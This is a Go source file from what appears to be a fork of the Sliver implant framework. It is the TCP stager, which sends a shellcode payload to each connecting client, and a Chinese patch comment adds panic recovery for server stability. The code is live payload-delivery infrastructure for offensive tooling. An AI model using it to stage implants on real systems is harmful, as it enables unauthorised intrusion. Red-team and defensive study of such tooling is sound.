package c2

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"fmt"
	"net"

	"4zreco/sliver/server/log"
)

/*
补丁元数据（patches/sliver 框架强制项）：
  - 目标文件：server/c2/tcp-stager.go
  - 修改原因：S5 残余缺口——v1.7.7 已为 mTLS/WG/DNS handler 补齐 recoverAndLogPanic
    （server/c2/panic_recover.go），但 TCP stager 的 accept/handleConnection goroutine
    漏掉了。stager 是 implant 可触达的网络路径，handler panic 仍会带崩整个 server 进程
    （与路线图 2.4 CVE-2026-29781 同类风险：单 implant 异常 → 全基础设施停摆）。
  - 修改内容：acceptConnections / handleConnection 各加一行 defer recoverAndLogPanic，
    与 mtls.go/wireguard.go/dns.go 现有写法完全一致。
  - 验证方法：(1) go build ./server/... 编译通过；(2) 部署后对 stager 端口发起异常连接
    （如半开/畸形数据）确认 server 存活且日志出现 "Recovered panic in"；(3) 正常 stager
    投递（curl 触发 shellcode 下发）功能不回归。
*/

var (
	tcpLog = log.NamedLogger("c2", "tcp-stager")
)

// StartTCPListener - Start a TCP listener
func StartTCPListener(bindIface string, port uint16, data []byte) (net.Listener, error) {
	tcpLog.Infof("Starting Raw TCP listener on %s:%d", bindIface, port)
	ln, err := net.Listen("tcp", fmt.Sprintf("%s:%d", bindIface, port))
	if err != nil {
		mtlsLog.Error(err)
		return nil, err
	}
	go acceptConnections(ln, data)
	return ln, nil
}

func acceptConnections(ln net.Listener, data []byte) {
	defer recoverAndLogPanic(tcpLog.Errorf, "tcp-stager accept loop")
	for {
		conn, err := ln.Accept()
		if err != nil {
			if errType, ok := err.(*net.OpError); ok && errType.Op == "accept" {
				break
			}
			tcpLog.Errorf("Accept failed: %v", err)
			continue
		}
		go handleConnection(conn, data)
	}
}

func handleConnection(conn net.Conn, data []byte) {
	defer recoverAndLogPanic(tcpLog.Errorf, "tcp-stager handleConnection")
	mtlsLog.Infof("Accepted incoming connection: %s", conn.RemoteAddr())
	tcpLog.Infof("Sending shellcode (%d)\n", len(data))
	// Send shellcode
	conn.Write(data)
	// Closing connection
	conn.Close()
}
